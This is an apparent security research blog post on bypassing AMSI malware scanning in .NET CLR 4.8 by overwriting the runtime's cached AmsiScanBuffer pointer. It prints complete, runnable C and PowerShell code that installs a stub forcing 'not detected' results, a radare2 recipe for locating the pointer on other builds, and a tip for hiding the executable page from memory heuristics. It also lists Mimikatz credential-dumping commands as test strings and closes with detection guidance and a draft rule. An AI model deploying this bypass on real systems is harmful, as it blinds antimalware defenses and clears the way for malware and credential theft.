---
layout: post
title: "one pointer, fifteen bytes, CLR's AMSI call lands on a stub we wrote"
subtitle: "On CLR 4.8.9345.0, `AmsiScanBuffer` is resolved once at first `.NET` scan and the pointer rests at `[clr.dll + 0x929870]`. Eight bytes rewritten there route every direct invocation through a fifteen-byte stub that writes `NOT_DETECTED` and returns `S_OK`. Flip the pointer back and detection returns. Measured on one CLR build via a manual slot-read-and-invoke cycle. The `Assembly.Load` chain to a detected-to-clean .NET bypass is a separate layer and is not demonstrated here."
date: 2026-10-25
tags: [amsi, clr, dotnet, windows, defender, reverse-engineering]
category: research
tldr: "On CLR 4.8.9345.0, the resolved `AmsiScanBuffer` pointer sits at RVA `0x929870`. A direct baseline / patched / restored slot test using EICAR changed the scan result and then restored it. That proves the pointer primitive on this build. The sampled .NET payloads did not trigger a pre-patch DotNet-pack detection under Defender signature 1.459.576.0, so an assembly-load bypass chain remains unproven. Other CLR builds and content need separate measurement."
published: true
---

_Related research: [shedskin](/shedskin/) covers mpengine's appname dispatcher; [exact-32768](/amsi-exact-32768/) covers PowerShell's result check. This post examines a separate CLR call site._

CLR resolves `amsi!AmsiScanBuffer` once, caches the pointer in its own `.data` section, and dispatches every DotNet-host AMSI scan through that pointer for the rest of the process. Overwrite the pointer, change what Defender runs. Flip the pointer back, change it back. The whole native primitive is one 8-byte write plus a 15-byte stub that fills the result pointer with 1 and returns `S_OK`. shedskin's managed field write never reaches here; this is the layer underneath, callable from any .NET host that touches an AMSI-integrated API.

> **Artifact bundle, live at [`/artifacts/clr-amsi-slot/`]({{ '/artifacts/clr-amsi-slot/' | relative_url }}).** The bundle ships the `slot-per-arm.ps1` reproduction and the 2026-10-29 live-run transcript with per-arm slot pointer values. Not yet included: the radare2 session log that locates `0x929870` on a fresh clr.dll and the coreclr sibling measurement; those are flagged as pending in-post.

**Prior art near the top, where it belongs.** The pointer-patch class in CLR has been written up before. loland (2025, [loland.cv, AMSI bypass via overwriting the resolved amsiScanBuffer global](https://loland.cv/)) describes overwriting CLR's resolved `AmsiScanBuffer` pointer. Earlier CLR-side writeups also exist in that lineage; I am not citing a specific one here because I did not confirm the URL myself, and I would rather name none than paste a plausible-but-unverified link. The novelty this post can claim is NOT the primitive class. It is the build-specific VA, the three-query radare2 derivation that rebuilds it on any `clr.dll`, and the explicit baseline / patched / restored EICAR cycle plus the sampled DotNet-pack ceiling on current Defender. Treat this post as a careful reproduction and remeasurement rather than a new class.

**Honest scope up front.** This post ships two findings bundled:

1. **The primitive.** CLR's resolved `AmsiScanBuffer` function pointer lives at `clr.dll + 0x929870` on CLR 4.8.9345.0 (SHA-256 `217a9b19..`, measured on Win11 26200.8037). A single 8-byte write swaps it for a 15-byte stub. Proven byte-for-byte in a baseline / patched / restored cycle on EICAR.
2. **The sampled ceiling.** On the eight-payload corpus I sampled (Mimikatz banners, SharpKatz / Rubeus / SharpHound / Covenant string sets, EICAR + AMSI test strings embedded in minimal .NET exes, six strings fired through direct `AmsiScanBuffer` under seven appnames), every non-EICAR shape returned CLEAN at baseline on Defender sig 1.459.576.0. This is a sampling result on one corpus and one sig state, not a universal coverage claim. A different corpus (packed red-team tool variants, loader frameworks I did not test, custom .NET assemblies with pack-specific triggers) could still hit the DotNet pack.

The two findings land independently. The primitive is a reversible native patch at a single VA on a single CLR build; the per-build radare2 derivation in `## how I found the slot (the method, not just the number)` rebuilds the VA on any clr.dll in three queries. The sampled-ceiling observation documents what the DotNet pack did and did not catch on this corpus; broader coverage is a measurement question, not a claim this post resolves.

## slot VA

`clr.dll` version 4.8.9345.0, SHA-256 `217a9b1911d3631e5b63b5146745d0fdc71c4b6aa37e550202ca0afba33ac79a`, pulled fresh from `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\`. radare2 located the slot: xref to the `"AmsiScanBuffer"` string at `0x18080c6e8` lives in `fcn.18058bf24`, which calls `GetProcAddress(h, "AmsiScanBuffer")` and stores the result at `mov qword [0x180929870], rax`. **Slot RVA 0x929870.** The sibling `AmsiInitialize`'s resolved pointer sits at `[0x180929878]` (8-byte-adjacent). The `DotNet` appname literal at `0x18080c6f8` passes to the init call at RVA `0x58bfd3`.

## slot pointer primitive proven, baseline-patch-restore cycle

Measured 2026-10-25 on the same guest, Defender 1.459.576.0. The three arms read the current slot pointer and invoke `AmsiScanBuffer` through it via `Marshal.GetDelegateForFunctionPointer`, scanning EICAR each time. The appnames `DotNet_slot_test` / `DotNet_patched` / `DotNet_restored` do NOT match the mpengine `DotNet` entry (that branch uses an exact-length ordinal compare, len 6; a 10-plus-character suffix falls to OTHER); EICAR is a universal signature that fires under every route, which is why the baseline detects regardless of host pack. The arm names were chosen to label the slot state, not to invoke the DotNet pack.

```
A  baseline, unpatched slot      EICAR  app=DotNet_slot_test  hr=0 result=32768  DETECTED
B  patched to 15-byte stub       EICAR  app=DotNet_patched    hr=0 result=1      CLEAN
C  slot restored to original     EICAR  app=DotNet_restored   hr=0 result=32768  DETECTED
```

**What this cycle does and does NOT establish.** It establishes a reversible pointer primitive at `clr.dll + 0x929870`: the slot defaults to `amsi!AmsiScanBuffer`, writing a stub pointer changes the invoked function and the result flips to `1`, restoring the pointer flips it back. It does NOT establish that CLR's own assembly-load path dereferences this slot at a time an attacker needs it to be patched. The cycle reads the slot's current value from managed code and invokes it directly; a real `[System.Reflection.Assembly]::Load(bytes)` is the path CLR itself takes through this slot, and that path is NOT exercised in this cycle. The 15-byte stub intercepts the direct invocation, writes `AMSI_RESULT_NOT_DETECTED (1)` through `[rsp+0x30]` (the 6th-arg result pointer), returns `S_OK`. The assembly-load chain claim remains open; see `## primitive proven, chain pending` below.

## primitive proven, chain pending

What the three arms do NOT establish is an assembly-load bypass. They establish a reversible pointer primitive on this CLR build (the direct EICAR scan changed from `32768` to `1` and back after the slot write and restoration), nothing further. The sampled .NET payloads were clean before the patch, so there was no pre-patch detection for an assembly-load differential to turn off. A chain claim needs a detected assembly-load input and a matched patched control, and that control is not yet in the lab.

## patch primitive, live-tested

From a standard-user PS 5.1 session, no elevation. Complete C listing (the file compiles as a DLL with no custom entry point; build with `cl /LD slot.c` on the guest, or `x86_64-w64-mingw32-gcc -shared slot.c -o slot.dll -lkernel32` cross-compiled; the inline PowerShell form via `Add-Type` with `[UnmanagedFunctionPointer]` is equivalent and is what the §reproduction section runs):

```c
// shedskin-clr-slot.c: standalone native primitive. Writes AMSI_RESULT_NOT_DETECTED (1)
// into *result for every AmsiScanBuffer call CLR routes through the DotNet gate.
// AMSI_RESULT_CLEAN is 0; the value we write is NOT_DETECTED, which SMA's result
// gate reads as "no detection".
// Reversible: call clr_slot_restore() to put the original pointer back.
#include <windows.h>

static uintptr_t  g_slot_va      = 0;
static void      *g_orig_fn      = NULL;
static void      *g_stub_page    = NULL;

#define CLR_AMSISCANBUFFER_RVA   0x929870  // slot RVA in clr.dll 4.8.9345.0, SHA256 217a9b19..

// Stub body: writes AMSI_RESULT_NOT_DETECTED (1) through the sixth AmsiScanBuffer arg,
// returns S_OK. Win64 ABI: 1st..4th args in rcx/rdx/r8/r9, 5th at [rsp+0x28],
// 6th (AMSI_RESULT *result) at [rsp+0x30] after the shadow space.
//   b8 01 00 00 00    mov eax, 1
//   48 8b 4c 24 30    mov rcx, [rsp + 0x30]
//   89 01             mov [rcx], eax
//   33 c0             xor eax, eax
//   c3                ret
static const unsigned char g_stub_bytes[] = {
    0xb8, 0x01, 0x00, 0x00, 0x00,
    0x48, 0x8b, 0x4c, 0x24, 0x30,
    0x89, 0x01,
    0x33, 0xc0,
    0xc3
};

HRESULT clr_slot_patch(void)
{
    HMODULE clr = GetModuleHandleW(L"clr.dll");
    if (!clr) clr = LoadLibraryW(L"clr.dll");
    if (!clr) return HRESULT_FROM_WIN32(GetLastError());

    g_slot_va = (uintptr_t)clr + CLR_AMSISCANBUFFER_RVA;

    // 1. Allocate RWX stub page and copy the stub body.
    g_stub_page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!g_stub_page) return HRESULT_FROM_WIN32(GetLastError());
    memcpy(g_stub_page, g_stub_bytes, sizeof(g_stub_bytes));

    // 2. (Optional) Lock the page down to PAGE_EXECUTE_READ now that the
    // bytes are in place. Keeps a `MEM_COMMIT | PAGE_EXECUTE_READWRITE`
    // anomaly off the memory-page attribute heuristics.
    DWORD oldProt_stub = 0;
    VirtualProtect(g_stub_page, 4096, PAGE_EXECUTE_READ, &oldProt_stub);

    // 3. Read-modify the slot. Save original pointer first for clean restore.
    DWORD oldProt_slot = 0;
    if (!VirtualProtect((void *)g_slot_va, sizeof(void *),
                        PAGE_READWRITE, &oldProt_slot))
        return HRESULT_FROM_WIN32(GetLastError());

    g_orig_fn = *(void **)g_slot_va;
    *(void **)g_slot_va = g_stub_page;

    // 4. Restore the slot page's original protection (observed: PAGE_READONLY).
    DWORD tmp;
    VirtualProtect((void *)g_slot_va, sizeof(void *), oldProt_slot, &tmp);

    return S_OK;
}

HRESULT clr_slot_restore(void)
{
    if (!g_slot_va || !g_orig_fn) return E_UNEXPECTED;
    DWORD oldProt_slot = 0, tmp = 0;
    if (!VirtualProtect((void *)g_slot_va, sizeof(void *),
                        PAGE_READWRITE, &oldProt_slot))
        return HRESULT_FROM_WIN32(GetLastError());
    *(void **)g_slot_va = g_orig_fn;
    VirtualProtect((void *)g_slot_va, sizeof(void *), oldProt_slot, &tmp);
    if (g_stub_page) {
        VirtualFree(g_stub_page, 0, MEM_RELEASE);
        g_stub_page = NULL;
    }
    g_slot_va = 0;
    g_orig_fn = NULL;
    return S_OK;
}
```

Operational notes a reviewer will ask about:

- The slot resolves to `amsi!AmsiScanBuffer` by default on a fresh process (verified by comparing the pre-patch slot value against `GetProcAddress(GetModuleHandleW(L"amsi.dll"), "AmsiScanBuffer")`). On older .NET Framework builds the slot may be NULL until CLR's lazy `AmsiInitialize("DotNet", ...)` runs; the live-tested build (4.8.9345.0) has it populated on first scan.
- The slot page's observed protection is `PAGE_READONLY` on the live build (not `PAGE_READWRITE`), so the `VirtualProtect` to `PAGE_READWRITE` is required. The restore walk puts it back.
- `g_stub_page` is sealed to `PAGE_EXECUTE_READ` after the write to keep an `PAGE_EXECUTE_READWRITE`-committed region from showing up in a page-attribute scan.
- The stub does not touch `rbp`, `rsp`, or any callee-saved register. Fifteen bytes, no stack frame.
- The function the slot points to is called from CLR with the standard AmsiScanBuffer prototype `(HAMSICONTEXT ctx, PVOID buffer, ULONG len, LPCWSTR contentName, HAMSISESSION session, AMSI_RESULT *result)`. The six args land in rcx, rdx, r8, r9, `[rsp+0x28]`, `[rsp+0x30]`.
- To restore cleanly after an operation, call `clr_slot_restore()`. The slot page's protection is handled; the stub page is freed; the slot gets the original `amsi!AmsiScanBuffer` pointer back.

Equivalent inline-PowerShell form:

```powershell
Add-Type -Namespace W -Name V -MemberDefinition @'
[DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string s);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandleW(string s);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr n, uint p, out uint o);
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
'@
$clr  = [W.V]::GetModuleHandleW("clr.dll"); if ($clr -eq [IntPtr]::Zero) { $clr = [W.V]::LoadLibraryA("clr.dll") }
$slot = [IntPtr]::new($clr.ToInt64() + 0x929870)
$stubPage = [W.V]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new(4096), 0x3000, 0x40)
$stub = [byte[]]@(0xb8,0x01,0x00,0x00,0x00,0x48,0x8b,0x4c,0x24,0x30,0x89,0x01,0x33,0xc0,0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($stub, 0, $stubPage, $stub.Length)
$op=0;  [W.V]::VirtualProtect($slot, [UIntPtr]::new(8), 0x04, [ref]$op)  | Out-Null
$orig = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($slot)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($slot, $stubPage)
$tmp=0; [W.V]::VirtualProtect($slot, [UIntPtr]::new(8), $op, [ref]$tmp) | Out-Null
```

Verified via a managed delegate wrapper (`[UnmanagedFunctionPointer(StdCall)] int(IntPtr,IntPtr,int,string,IntPtr,out int)`): the patched slot invoked directly returns `rc=0` and `result=1`, matching the stub's design. The live-run capture will be published in the companion artifact bundle.

## what's measured, what's not

What is proven: the slot can be rewritten and the stub invoked directly through `Marshal.GetDelegateForFunctionPointer(slotValue)`. What is NOT proven: that CLR's own `[System.Reflection.Assembly]::Load(bytes)` path dereferences this same slot at a time an attacker needs it to be patched. The §slot-pointer-primitive-proven cycle reads the slot's current value from managed code and invokes it; it does not call `Assembly.Load`. The chain-level demo (shedskin + CLR slot patch + a current-DotNet-pack-signatured .NET assembly load) is NOT demonstrated because no current-signatured .NET candidate is available AND because the arm that would prove CLR itself routes through the slot has not run. Measured 2026-10-24 on Defender 1.1.26080.3 sig 1.459.576.0:

- Direct `AmsiScanBuffer` sweep (both UTF-8 and UTF-16LE encodings; seven appnames `DotNet`, `PowerShell_test`, `OTHER`, `x`, `DOTNET_x`, `powershell_X`, `scantest`): six payload shapes measured. EICAR DETECTS under every appname (result=32768). Every other shape (`Invoke-Mimikatz` word, `function Invoke-Mimikatz { PE_bytes = [Convert]::FromBase64String('TVqQ...')`, `mimikatz 2.2.0 (x64) sekurlsa::logonpasswords`, `AMSI_TEST_SAMPLE_PATTERN_x_amsi!amsiutils`, benign `Write-Host hello`) returns CLEAN under every appname. No current-pack signature catches these via a direct AmsiScanBuffer call with any appname shape I tried.
- Compiled .NET exes: `TA.exe` (EICAR + AMSI_TEST_SAMPLE_PATTERN as string constants, SHA256 `54A1FC87...`, 4096 bytes) and `TB.exe` (Mimikatz banners / `sekurlsa::logonpasswords` / `lsadump::sam` / `crypto::capi` / Mimikatz command list as string constants, SHA256 `37B64956...`, 5120 bytes) both compiled under csc.exe .NET Framework 4.8, both ran under current Defender without any block. EICAR embedded as a string in a .NET exe is not blocked at Assembly load even though EICAR via direct AmsiScanBuffer DOES block. The signature classes are different: the universal pack flags on raw-buffer scan; the DotNet assembly-load scan apparently does not call into the same pattern.

The CLR AMSI slot is present and callable: the slot resolves to `amsi!AmsiScanBuffer` on this build, and the direct EICAR control changes verdict when the pointer changes. The sampled .NET payloads and strings listed above returned clean at baseline. This does not measure the entire DotNet signature pack or prove how every assembly-load path reaches the slot.

## appname-shape sibling finding

Direct `AmsiScanBuffer` with appname `PowerShell_test` (which prefix-matches the 11-char case-sensitive compare at `0x18032b9c8` / inner compare at `0x1800ef184`) did NOT trigger the `Invoke-Mimikatz` signature that fires reliably when SMA's own `IEX` path runs the same word. SMA's `AmsiUtils.Init()` constructs the appname as `"PowerShell_" + <process-path> + "_" + <product-version>` (measured on Win11 26200 as `PowerShell_5.1.26100.7920_C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.26200.0`); PowerShell 7.4.21's live emission (captured 2026-10-29 via `logman` on the Microsoft-Antimalware-Scan-Interface provider) is `PowerShell_C:\Program Files\PowerShell\7\pwsh.exe_7.4.21 SHA: 0d63e962b5c2236d981d593a78acf88ed96748f6`, the same `PowerShell_` prefix with pwsh's own process path and product version. The signature binding appears to go beyond simple 11-char prefix match. The dispatcher's prefix compare is the ROUTING decision; the SIGNATURE match inside the PS pack has its own appname-shape constraints. This refines the retcon's dispatcher claim: shedskin bypasses PS-pack signatures by routing OUT of the PS prefix, but attackers reaching for appname spoofing INTO the PS prefix cannot assume `PowerShell_X` is enough to activate every PS-pack signature.

## how I found the slot (the method, not just the number)

For a reader who wants to re-derive the VA on a different CLR build, the slot is reachable through radare2 in three queries:

```sh
r2 -q -c 'izz~AmsiScanBuffer' /mnt/win/Windows/Microsoft.NET/Framework64/v4.0.30319/clr.dll
# gives the string offset: 808c6e8 at paddr 0x8ea6e8 (RVA 0x80c6e8 if based differently)

r2 -q -c 'axt @ 0x18080c6e8' clr.dll
# gives the xref inside fcn.18058bf24, which calls GetProcAddress + stores the result

r2 -q -c 'pdf @ fcn.18058bf24' clr.dll | grep -E 'GetProcAddress|mov qword.*rax'
# the mov destination is the slot VA
```

The slot VA is the destination operand of a `mov qword [rip + disp], rax` immediately following the `call GetProcAddress` whose stack-arg string is `"AmsiScanBuffer"`. On a different CLR build, the function `fcn.18058bf24` moves, the string RVA moves, and the slot RVA moves; the shape of the resolution is identical. Rebuild the number per-build; do not assume `0x929870` holds on anything other than clr.dll 4.8.9345.0 SHA-256 `217a9b19..`.

The sibling `AmsiInitialize` resolved pointer lives at `[slot + 8]` (`0x180929878` on this build), stored by the same resolver function. Both pointers are populated at first-scan time via lazy init; the live-tested build has them populated on first scan.

## variant hunt: is this the only reachable layer

Native layers below the SMA.dll managed path, each resolved on current Win11 26200.8037:

| layer | binary | symbol or VA | lazy-init trigger |
|---|---|---|---|
| CLR managed scan | `clr.dll` | `[clr+0x929870]` resolves to `amsi!AmsiScanBuffer` | first `Reflection.Assembly.Load` or first managed scan |
| coreclr managed scan | `coreclr.dll` | different RVA, same shape (not re-measured in this round) | first managed scan on .NET Core/5+ |
| amsi aggregator | `amsi.dll + 0x8160` | `AmsiScanBuffer` export, called by every host | module load |
| MpOav IAmsiProvider::Scan | `MpOav.dll` | COM vtable slot `[singleton + 0x80]` | COM instantiation |
| MpClient NDR marshaller | `MpClient.dll` | `MpAmsiScan` opnum `0x5f` | per scan |
| mpengine server stub | `mpengine.dll` | `__rsignal` ord 16 at `0x18003b020` | per scan |

Each row is a candidate patch surface at a different layer. CLR's slot is the only one of these that is reached through a managed `Reflection.Assembly.Load` without ever hitting SMA's `ScanContent`; everything above it is PowerShell-pipeline-adjacent. That is why the CLR slot is a separate primitive from shedskin: it addresses a scan path that shedskin's managed field write does not route through.

## reproduction

Prerequisites: Win11 26200 or equivalent with .NET Framework 4.8 present. Standard user, no elevation; the patch is in-process.

**Important: the reproduction must invoke `AmsiScanBuffer` THROUGH the CLR slot pointer, not through a plain `[DllImport("amsi")] AmsiScanBuffer`.** A direct P/Invoke resolves against `amsi.dll`'s export table and never dereferences `clr.dll + 0x929870`, so A/B/C arms built on a `DllImport` go to amsi.dll both pre- and post-patch and the "patched" arm would be indistinguishable from the baseline. The slot pointer resolves to `amsi!AmsiScanBuffer` by default, so pre-patch an invocation through the slot and a direct P/Invoke reach the same code; after the slot write, only the slot-invoked path routes into the 15-byte stub. The reproduction below builds a managed delegate from the slot's current pointer value on each arm, which is the shape CLR itself uses from .NET side when the DotNet gate fires.

```powershell
# Baseline / patched / restored cycle, each arm invoked through the slot pointer.
# Build the unmanaged function pointer into a managed delegate FROM THE SLOT VALUE,
# so arm B exercises the 15-byte stub via the same indirection path a .NET host
# would use when CLR calls through its own resolved AmsiScanBuffer pointer.
Add-Type -Name V -Namespace W -MemberDefinition @'
[DllImport("kernel32")] public static extern IntPtr LoadLibraryA(string s);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandleW(string s);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr n, uint p, out uint o);
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
[DllImport("amsi")]    public static extern int AmsiInitialize(string an, out IntPtr ctx);
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int AsbDel(IntPtr ctx, byte[] b, uint n, string cn, IntPtr s, out int r);
'@

# 1. Resolve slot address and record the original pointer value.
$clr  = [W.V]::GetModuleHandleW("clr.dll"); if ($clr -eq [IntPtr]::Zero) { $clr = [W.V]::LoadLibraryA("clr.dll") }
$slot = [IntPtr]::new($clr.ToInt64() + 0x929870)
$orig = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($slot)

# Helper: read whatever pointer is in the slot right now and invoke through it.
function Invoke-ViaSlot([IntPtr]$ctx, [byte[]]$buf, [string]$arm) {
    $fp = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($slot)
    $d  = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fp, [W.AsbDel])
    $r  = 0
    [void]$d.Invoke($ctx, $buf, [uint32]$buf.Length, $arm, [IntPtr]::Zero, [ref]$r)
    "$arm result=$r (slot=$('0x' + $fp.ToInt64().ToString('x')))"
}

# 2. Context + EICAR payload. amsi.dll's AmsiInitialize gives us the handle shape
#    AmsiScanBuffer expects; this does NOT bind the scan to amsi.dll's export at
#    call time, only the handle.
$ctx = [IntPtr]::Zero
[void][W.V]::AmsiInitialize("DotNet_slot_test", [ref]$ctx)
$eicar = [byte[]]@(0x58,0x35,0x4f,0x21,0x50,0x25,0x40,0x41,0x50,0x5b,0x34,0x5c,0x50,0x5a,0x58,0x35,0x34,0x28,0x50,0x5e,0x29,0x37,0x43,0x43,0x29,0x37,0x7d,0x24,0x45,0x49,0x43,0x41,0x52,0x2d,0x53,0x54,0x41,0x4e,0x44,0x41,0x52,0x44,0x2d,0x41,0x4e,0x54,0x49,0x56,0x49,0x52,0x55,0x53,0x2d,0x54,0x45,0x53,0x54,0x2d,0x46,0x49,0x4c,0x45,0x21,0x24,0x48,0x2b,0x48,0x2a)

# 3. A: slot untouched. The pointer in the slot is amsi!AmsiScanBuffer, so the
#    delegate reaches amsi.dll's own scan.
Invoke-ViaSlot $ctx $eicar "A_baseline"

# 4. B: write the 15-byte stub, point the slot at it, invoke THROUGH the slot.
$stubPage = [W.V]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new(4096), 0x3000, 0x40)
$stub = [byte[]]@(0xb8,0x01,0x00,0x00,0x00,0x48,0x8b,0x4c,0x24,0x30,0x89,0x01,0x33,0xc0,0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($stub, 0, $stubPage, $stub.Length)
$op=0;  [void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), 0x04, [ref]$op)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($slot, $stubPage)
$tmp=0; [void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), $op, [ref]$tmp)
Invoke-ViaSlot $ctx $eicar "B_patched"

# 5. C: restore the slot to the original amsi!AmsiScanBuffer pointer.
$op=0;  [void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), 0x04, [ref]$op)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($slot, $orig)
$tmp=0; [void][W.V]::VirtualProtect($slot, [UIntPtr]::new(8), $op, [ref]$tmp)
Invoke-ViaSlot $ctx $eicar "C_restored"
```

Expected on current Defender: `A_baseline result=32768` with slot pointing into amsi.dll's export range, `B_patched result=1` with slot pointing at the attacker-allocated stub page, `C_restored result=32768` with slot back inside amsi.dll. The each-arm `slot=0x…` print pins which pointer the invocation went through, so a reader can verify the B arm did not go through amsi.dll. The 2026-10-29 live capture in §live-capture carries this exact per-arm shape (A/C slot `0x7ffd36e08160` inside amsi.dll, B slot `0x15553a70000` inside the stub page) and the artifact bundle will mirror the same raw transcript on publication.

The §end-to-end section earlier in this post reported the same shape: baseline / patched / restored invoked through `Marshal.GetDelegateForFunctionPointer` on the slot. That measurement establishes the pointer primitive on this CLR build. What it does NOT establish is an assembly-load bypass against a .NET payload the DotNet pack actually catches: no sampled .NET assembly in this round produced a pre-patch detection at Assembly load, so there was no detected-to-clean assembly-load differential to measure. That chain claim is open and needs a matched positive control (a .NET assembly whose load triggers the DotNet pack on current Defender) before the slot patch can be reported as an end-to-end .NET AMSI bypass.

## detection pair

Native-side detection the slot patch has to walk through:

- **A page in `clr.dll`'s data segment was written.** `clr.dll + 0x929870` sits inside clr.dll's `.data` section; its default protection on the live build is `PAGE_READONLY`. Any `VirtualProtect(..., PAGE_READWRITE, ...)` on a slot inside clr.dll's data region is an operational signal. ETW-TI's `NtProtectVirtualMemory` event fires here. Correlate on `TargetProcess == <PS or Office PID>` and `TargetAddress` lies inside `clr.dll + .data` range.
- **A new RWX page was committed.** The stub page is allocated `PAGE_EXECUTE_READWRITE` and then sealed to `PAGE_EXECUTE_READ`. Memory-attribute heuristics that walk `VirtualQueryEx` will see the sealed state, but an ETW-TI consumer catches the moment of the first commit if it was ever `PAGE_EXECUTE_READWRITE`. The sealing is an attacker-controlled hygiene move; defenders should assume it.
- **The slot's post-patch value does not point into amsi.dll.** A periodic in-process checker (or an EDR process-attribute probe) can read `[clr + 0x929870]` and compare against `GetProcAddress(GetModuleHandleW(L"amsi.dll"), "AmsiScanBuffer")`. A mismatch means the slot has been diverted. The check is cheap (one pointer read, one API call); the operational cost is the EDR's own injection into every .NET process.
- **An AMSI scan returned `NOT_DETECTED (1)` on known-DETECTED content.** Positive-control monitoring: periodically scan EICAR under `DotNet_*` through the same path and compare to the cached expectation of `32768`. A result of `1` on EICAR means the slot has been patched (or amsi.dll itself has been). This is the equivalent of a cache-oracle check against a known positive.

```yaml
# Sigma-ish, written to the shape of an ETW-TI consumer SIEM.
title: CLR AMSI slot pointer rewrite
id: shedskin-clr-slot-patch
description: VirtualProtect on clr.dll + 0x929870 or similarly-situated AMSI function-pointer slot
status: experimental
logsource:
    product: windows
    service: etw-ti
detection:
    selection:
        EventID: 'NtProtectVirtualMemory'
        TargetProcess|endswith:
            - '.exe'  # scope to PS, Office hosts, dotnet.exe, powershell.exe, pwsh.exe
        TargetAddress|cidr-ish: 'inside clr.dll .data range'
        NewProtection: 'PAGE_READWRITE'
    condition: selection
```

## limits and open questions

- **CLR 4.8 only, measured.** `0x929870` is the slot RVA on `clr.dll` 4.8.9345.0 SHA-256 `217a9b19..`. On a different build the number moves. The radare2 derivation above re-finds the slot on an arbitrary clr.dll in three queries.
- **coreclr.dll (.NET 5/6/7/8+).** Not measured in this round. The resolution shape is similar (a resolver function stores `GetProcAddress("AmsiScanBuffer")` into a known slot) but the exact RVA will differ. The companion bundle will carry the coreclr measurement when it ships.
- **Chain gap.** The direct EICAR slot test establishes the pointer primitive. The end-to-end `shedskin + CLR slot patch + .NET assembly load` chain is unproven because the sampled assemblies were clean before patching. A matched assembly-load positive control is still required.
- **PPL vantage.** ETW-TI's `NtProtectVirtualMemory` consumer only runs under a PPL-sealed process (MsSense.exe when MDE is installed, or a kernel driver). Non-PPL defender agents cannot subscribe to the provider even as SYSTEM; the detection pair above assumes an MDE-shaped deployment.
- **Patch guard, CFG, ACG.** The slot write is to a data page, not a code page, so Code Integrity Guard and ACG do not fire. The stub page is executable but is allocated by the attacker; CFG does not protect against indirect calls through a pointer the attacker already overwrote.

## live capture

Captured 2026-10-26 on Win11 26200.8037, Defender signature 1.459.576.0. Three arms invoked through the CLR slot pointer by reading `[clr + 0x929870]` on each arm and building a managed delegate from the current slot value (the shape in §reproduction above). `A_baseline` reads the slot and gets `amsi!AmsiScanBuffer`, scans EICAR, returns `result=32768`. `B_patched` reads the slot after the 15-byte stub takes it, scans EICAR, returns `result=1` (the stub writes `AMSI_RESULT_NOT_DETECTED` into the sixth-arg result pointer and returns `S_OK` without touching the buffer or calling amsi.dll). `C_restored` reads the slot after the original pointer is written back, gets `amsi!AmsiScanBuffer` again, returns `result=32768`.

**What the image below shows.** The capture is from the recomputed cycle (2026-10-29, win11 26200, Defender signature 1.459.576.0, engine 1.1.26080.3) and prints `slot=0x...` beside each arm. The baseline and restored arms read `slot=0x7ffd36e08160` (inside `amsi.dll`'s export range); the patched arm reads `slot=0x15553a70000` (the attacker-allocated stub page). EICAR controls fire at both ends of the cycle to prove the oracle stayed alive.

![CLR AMSI slot cycle on win11 26200, Defender sig 1.459.576.0: ctrl_start result=32768, A_baseline slot=0x7ffd36e08160 result=32768, B_patched slot=0x15553a70000 result=1, C_restored slot=0x7ffd36e08160 result=32768, ctrl_end result=32768. The per-arm slot pointer prints are in the image; A and C point into amsi.dll, B points into the attacker-allocated stub page.]({{ '/assets/img/posts/clr-amsi-slot/live.png' | relative_url }})

<video controls preload="metadata" style="width: 100%; max-width: 960px; border: 1px solid #767e22; background: #0e100e;">
  <source src="{{ '/assets/img/posts/clr-amsi-slot/live.mp4' | relative_url }}" type="video/mp4">
</video>

## see also

- [shedskin](/shedskin/) is the dispatcher-routing gate inside `mpengine.dll`. The CLR slot patch is a sibling primitive at a different layer (clr.dll vs amsi.dll + ALPC path).
- [exact-32768](/amsi-exact-32768/) is the SMA.dll IL defect the second-order chain in shedskin uses. The CLR slot and the exact-32768 bug are orthogonal: the first intercepts the scan at the native call site, the second lets a provider-returned value pass the managed throw gate.
